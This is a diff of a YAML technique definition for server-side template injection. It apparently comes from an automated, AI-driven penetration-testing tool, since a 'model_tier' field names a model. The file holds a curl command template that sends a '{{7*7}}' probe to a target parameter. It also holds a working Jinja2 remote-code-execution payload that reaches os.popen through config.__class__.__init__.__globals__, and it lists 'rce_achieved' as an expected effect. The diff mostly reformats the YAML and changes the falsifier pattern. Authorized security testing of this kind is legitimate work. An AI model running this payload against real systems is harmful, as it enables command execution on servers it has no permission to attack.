@@ -2,17 +2,20 @@ name: ssti
 category: web
 description: Server-Side Template Injection exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_url: from_finding.url
   parameter: from_finding.parameter
-command_template: "curl -s '{target_url}' -d '{parameter}={{{{7*7}}}}'"
+command_template: curl -s '{target_url}' -d '{parameter}={{{{7*7}}}}'
 parser: null
 expected_effects:
-  - template_injection_confirmed
-  - rce_achieved
+- template_injection_confirmed
+- rce_achieved
 falsifier:
-  pattern: "error|49 not in response"
+  pattern: 500|error|blocked|filtered
   timeout: 30
 model_tier: haiku
-mechanism: "Inject template expressions. Detection: {{7*7}}→49 confirms injection. Exploitation depends on engine: Jinja2 (Python), Twig (PHP), Freemarker (Java). Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}."
+mechanism: 'Inject template expressions. Detection: {{7*7}}→49 confirms injection.
+  Exploitation depends on engine: Jinja2 (Python), Twig (PHP), Freemarker (Java).
+  Jinja2 RCE: {{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}.'
+hacktricks_ref: network-services-pentesting/pentesting-web/django.md
